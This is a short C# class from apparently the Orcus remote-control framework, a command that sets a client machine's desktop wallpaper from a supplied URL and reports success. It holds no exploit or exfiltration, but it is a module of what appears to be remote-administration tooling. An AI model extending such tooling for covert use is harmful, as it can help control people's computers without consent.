using Orcus.Commands.FunActions;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.StaticCommands.System;

namespace Orcus.StaticCommands
{
    public class ChangeWallpaperCommandEx : ChangeWallpaperCommand
    {
        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            commandParameter.InitializeProperties(this);

            DesktopWallpaper.Set(WallpaperUrl, DesktopWallpaperStyle);
            feedbackFactory.Succeeded();
        }
    }
}